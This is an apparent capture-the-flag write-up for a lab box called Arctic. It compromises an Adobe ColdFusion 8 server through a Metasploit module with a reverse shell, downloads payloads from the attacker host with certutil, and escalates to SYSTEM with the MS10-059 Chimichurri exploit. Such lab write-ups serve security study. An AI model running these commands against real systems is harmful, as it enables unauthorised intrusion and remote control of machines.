## Box: Arctic

## Target IP: `10.10.10.11`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -vv -T4 -oA nmap/arctic 10.10.10.11
```

Ports open:

| Port | Service |
| --- | --- |
| 135 | msrpc |
| 8500 | http (Adobe ColdFusion 8,0,1,195765) |
| 49154 | msrpc |

---

### Web Enumeration

Hit webserver at `http://10.10.10.11:8500`.

Slow as hell.

Found ColdFusion admin portal at `/CFIDE/administrator/`.

No credentials.

---

### Exploitation

Searched for ColdFusion exploits. Found `ColdFusion 8.0.1 Directory Traversal + RCE`.

Fired up Metasploit:

```bash
msfconsole
```

Search:

```bash
search coldfusion
```

Selected:

```bash
use exploit/windows/http/coldfusion_fckeditor
```

Set options:

```bash
set RHOSTS 10.10.10.11
set RPORT 8500
set payload java/jsp_shell_reverse_tcp
set LHOST tun0
set LPORT 4444
```

First attempt failed.

Set:

```bash
set HttpClientTimeout 150
```

Exploit.

Reverse shell succeeded.

Confirmed:

```bash
whoami
```

Output: `tolis`.

---

### User Flag

Navigated:

```bash
cd C:\Users\tolis\Desktop
type user.txt
```

Grabbed user flag.

---

### Privilege Escalation Preparation

Checked system info:

```bash
systeminfo
```

Output: Windows Server 2008 R2 x64.

Generated custom payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4321 -f exe -o shell.exe
```

Served payload:

```bash
python3 -m http.server 80
```

On victim, downloaded:

```bash
certutil.exe -urlcache -split -f http://10.10.14.15/shell.exe shell.exe
```

Confirmed with:

```bash
dir
```

`shell.exe` present.

---

### Attempted Meterpreter Session

Set up handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4321
exploit
```

Tried running `shell.exe` on victim.

Connection failed.

---

### Pivot to Kernel Exploit

Found `chimichurri.exe` for privilege escalation (MS10-059).

Cloned:

```bash
git clone https://github.com/egre55/windows-kernel-exploits.git
```

Navigated into:

```bash
cd windows-kernel-exploits/MS10-059\ Chimichurri/Compiled
```

Grabbed `chimichurri.exe`.

Served:

```bash
python3 -m http.server 80
```

On victim, downloaded:

```bash
certutil.exe -urlcache -split -f http://10.10.14.15/chimichurri.exe chimichurri.exe
```

Confirmed with:

```bash
dir
```

---

### Root Shell

Started Netcat listener:

```bash
nc -lvnp 4444
```

On victim ran:

```bash
chimichurri.exe 10.10.14.15 4444
```

Shell connected back.

Confirmed:

```bash
whoami
```

Output: `NT AUTHORITY\SYSTEM`.

---

### Root Flag

Navigated:

```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

Grabbed root flag.
